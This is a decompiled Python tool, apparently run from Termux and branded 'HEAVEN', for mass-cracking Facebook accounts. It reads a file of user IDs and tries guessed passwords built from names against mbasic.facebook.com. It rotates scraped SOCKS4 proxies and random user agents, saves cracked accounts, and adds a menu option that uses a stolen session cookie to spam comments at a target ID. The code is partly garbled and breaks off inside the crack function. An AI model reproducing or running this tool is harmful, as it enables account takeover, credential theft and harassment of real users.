# Decompiled By HEAVEN
import os
import socket,subprocess
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END

#-----------------[ IMPORT-MODULE ]-------------------#


def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Usage
ip = get_ip()


def modules():
	print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import rich
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] RICH IS BEING INSTALLED \033[1;37m")
		os.system('pip install rich --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] RICH HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] BS4 IS BEING INSTALLED \033[1;37m")
		os.system('pip install bs4 --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] BS4 HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import requests
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] REQUESTS IS BEING INSTALLED \033[1;37m")
		os.system('pip install requests --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] REQUESTS HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	exit()

try:
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#

#import netifaces

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
reset = "[/]"
#------------[ INDICATION ]---------------#

#------------------[ PROXY ]-------------------#

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/THE-LEGEND-VIICTOR/useragnet').text
	open('green.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/013.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.8.10 3gpp-gba'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Dalvik/2.1.0 (Linux; U; Android'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/THE-LEGEND-VIICTOR/mactsaor/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    ###----------[ USER AGENT ]---------- ###
ua_default = 'David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]'
ua_Benco = 'Mozilla/5.0 (Linux; Android 11; Lenovo Yoga Tab 3 Plus Wi-Fi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A500FU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36'
ua_nokia   = 'Mozilla/5.0 (Linux; Android 10; Nokia C1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 UCURSOS/v1.6_285-android'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOM30.255-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15'
ua_asus    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'
ua_lenovo  = 'Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOM30.255-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 10; NOH-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
ua_windows = 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]'


#------------------[ MACHINE-SUPPORT ]---------------#

def adrian(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():pass
def contact():
	os.system('xdg-open https://facebook.com/profile.php?id=100080987563928&mibextid=ZbWKwL/')
	back()
def linex():
	print('\x1b[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[1;37m')
def cls():
	os.system('clear')
	banner()
	info()

#------------------[ adrian-LAKNAT ]-----------------#
def banner():
	clear()
	adrian(f'''\t{asu}

\033[1;39mHH   HH EEEEEEE   AAA   VV     VV EEEEEEE NN   NN 
\033[1;32mHH   HH EE       AAAAA  VV     VV EE      NNN  NN 
\033[1;39mHHHHHHH EEEEE   AA   AA  VV   VV  EEEEE   NN N NN 
\033[1;32mHH   HH EE      AAAAAAA   VV VV   EE      NN  NNN 
\033[1;39mHH   HH EEEEEEE AA   AA    VVV    EEEEEEE NN   NN 
''')
#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" [\x1b[1;91m=\033[1;37m] ENTER YOUR REAL NAME")
        linex()
        uname = input(" [\x1b[1;91m=\033[1;37m] ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" [\x1b[1;91m=\033[1;37m] ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" [\x1b[1;91m=\033[1;37m] ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    adrian(" [\x1b[1;91m=\033[1;37m] YOUR DETAILS HAS BEEN CHANGED ")
    
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    def linex():
        print('\033[1;37m----------------------------------------------')
        
def approval():
  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
  id = "HEAVEN-"+"".join(uuid)
  os.system('clear')
  banner()
  print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/ISHAK-LYA/aprove/blob/main/aprove.txt").text
    if id in httpCaht:
      print("\033[1;97m >> Your Key Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      print("\x1b[1;97m >> Send Key on Facebook ! ");
      time.sleep(0.1)
      
      input(' >> Click Enter To Send Your Key ')
      
      os.system('xdg-open https://www.facebook.com/profile.php?id=61553588913446')
      
      time.sleep(1)
      
      
      exit()
      
  except: 
  	
     print(" >> Unable To Fetch Data From Server ")
     
     time.sleep(2)
     
     exit()
approval()
            

#------------------[ MENU ]----------------#
def menu():
    os.system('clear')
    banner()
    linex()
    adrian(f'{asu} ARTHUR :  ISHAK XWD')
    adrian(f'{asu} TOOL  :  PREMIUM')
    linex()
    print(f""" [\x1b[1;91m1\033[1;37m] CLONE FILE         [\x1b[1;91m4\033[1;37m] RESET NAME""")
    print(f""" [\x1b[1;91m2\033[1;37m] SPAM SMS           [\x1b[1;91m5\033[1;37m] CONTACT ADMIN""")
    print(f" [\x1b[1;91m3\033[1;37m] CHECK -CP&OK       [\x1b[1;91m0\033[1;37m] adrianUT COOKIE")
    linex()
    _____cowok__pink_____ = input(' CHOOSE : ')
    
    if _____cowok__pink_____ in ['1', '01']:
        crack_file()
    elif _____cowok__pink_____ in ['2', '02']:
        bot_by_adrian()
    elif _____cowok__pink_____ in ['3', '03']:
        result()
    elif _____cowok__pink_____ in ['4', '04']:
        input()
        os.system('rm -rf data/password.xml')
        linex()
        adrian(' [] PASSWORD RESET ')
        exit()
    elif _____cowok__pink_____ in ['5', '05']:
        os.system('rm -rf data/name.xml')
        linex()
        adrian(' [Ã¢Åâ] NAME RESET ')
        exit()
    elif _____cowok__pink_____ in ['6', '06']:
        contact()
    elif _____cowok__pink_____ in ['0']:
        os.system('rm -rf data/.token.txt')
        os.system('rm -rf .cookie.txt')
        linex()
        adrian(' [Ã¢Åâ] DONE l ')
        exit()
    else:
        linex()
        adrian(' [Ãâ] SELECT CORRECTLY ')
        back()
	#-----------------[ HASIL-CRACK ]-----------------#

def result():
	linex()
	os.system('clear')
	banner()
	print(' [\x1b[1;91m1\033[1;37m] CHECK CP IDZ ')
	print(' [\x1b[1;91m2\033[1;37m] CHECK OK IDZ ')
	print(' [\x1b[1;91m0\033[1;37m] EXIT ')
	linex()
	kz = input(' [\x1b[1;91m=\033[1;37m] CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			adrian(' [\x1b[1;91m=\033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			adrian(' [\x1b[1;91m=\033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					linex()
					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
			linex()
			geeh = input(' [\x1b[1;91m=\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				adrian(' [\x1b[1;91m=\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				linex()
				adrian(' [\x1b[1;91m=\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\x1b[1;91m=\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			linex()
			adrian(' [\x1b[1;91m=\033[1;37m] FILE NOT FOUND ')
			time.sleep(2)
			back()
		if len(vin)==0:
			linex()
			adrian(' [\x1b[1;91m=\033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					linex()
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
			linex()
			geeh = input(' [\x1b[1;91m=\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				adrian(' [\x1b[1;91m=\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				linex()
				adrian(' [\x1b[1;91m=\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\x1b[1;91m=\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		linex()
		adrian(' [\x1b[1;91m=\033[1;37m] NO OPTION FOUND IN MENU')
		exit()

#-------------[ SPAM MSG BY HEAVEN ]------------------#
def bot_by_HEAVEN():
    cookies = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mEnter Cookie > \x1b[1;93m')
    limit   = int(input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSMS LIMIT > \x1b[1;93m'))

    print('\n\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mUse commas to separate text spam sms. Example : \x1b[1;93mHELLO,HI, HEAVENINXIDE ?')
    text_komen = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mDrop that spam message you wanna spam> \x1b[1;93m')
    userid     = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mTARGET ID > \x1b[1;93m')
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1)
               if 'EAAG' in search:
                   komen(cookies,search,limit,text_komen,userid)
         except AttributeError:exit('\n\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mCookie Invalid')

def komen(coki,token,limit,text_komen,userid):
    a = 0
    for _ in range(limit):
        a +=1
        for z in text_komen.split(','):
            b = requests.post(f'https://graph.facebook.com/{userid}/comments/?message={z}&access_token={token}', cookies={'cookie':coki})
            if 'We limit how often you can post, comment, or do other things in a certain amount of time to help protect the community from spam. You can try again later. Learn More' in b.text:
                exit('\n\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mAccount limit !')
            if 'id' in b.text:
                print(f'\r\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSPAMMED> \x1b[1;93m{a}',end=' ')
            else:
                continue
#-------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
	linex()
	o = input(' [\x1b[1;91m=\033[1;37m] FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		adrian(' [=] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" [\x1b[1;91m1\033[1;37m] OLD CRACK")
	print(" [\x1b[1;91m2\033[1;37m] NEW CRACK")
	print(" [\x1b[1;91m3\033[1;37m] RANDOM CRACK")
	linex()
	hu = input(' [\x1b[1;91m=\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print(" [\x1b[1;91m=\033[1;37m] LOGIN METHOD ")
	linex()
	print(" [\x1b[1;91m1\033[1;37m] METHOD 1 (FOR WIFI)")
	print(" [\x1b[1;91m2\033[1;37m] METHOD 2 (FOR DATA)")
	linex()
	hc = input(' [\x1b[1;91m=\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')
#	elif hc in ['2','02']:
#		method.append('p')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('free')
	else:
		method.append('mobile')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	print(f' [\x1b[1;91m=\033[1;37m] TOTAL PROCESS : \x1b[1;91m',str(len(id)))
	print(" \033[1;37m[\x1b[1;91m=\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \u001b[\x1b[1;93m>>\033[1;37mUSE FLIGHT MODE AFTER 5 MINUTES ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append('@'+frs+'@')	
					pwv.append(frs+'@1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('@'+frs+'@')	
					pwv.append(frs+'@1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')
	print(' [\x1b[1;91m=\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' [\x1b[1;91m=\033[1;37m] OK : %s '%(ok))
	print(' [\x1b[1;91m=\033[1;37m] CP : %s '%(cp))
	linex()
	woi = input(' \u001b[\x1b[1;93m>>\033[1;37m ENTER TO BACK')
	exit()

#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {P}[HEAVEN-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
